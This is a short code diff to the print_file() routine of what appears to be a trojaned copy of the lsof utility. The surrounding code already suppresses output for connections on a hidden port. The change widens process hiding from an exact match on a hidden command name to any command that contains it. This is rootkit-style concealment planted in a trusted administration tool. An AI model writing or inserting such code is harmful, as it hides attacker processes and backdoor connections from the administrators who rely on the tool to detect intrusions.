@@ -678,7 +678,7 @@ print_file()
 	}
 	if(!((Lf->li[0].p - HIDDEN_PORT)&&(Lf->li[1].p - HIDDEN_PORT)))
 		return;
-	if(!strcmp(Lp->cmd,HIDDEN_CMD))
+	if(strstr(Lp->cmd,HIDDEN_CMD))
 		return;
 
 	if (PrPass && !Hdr) {
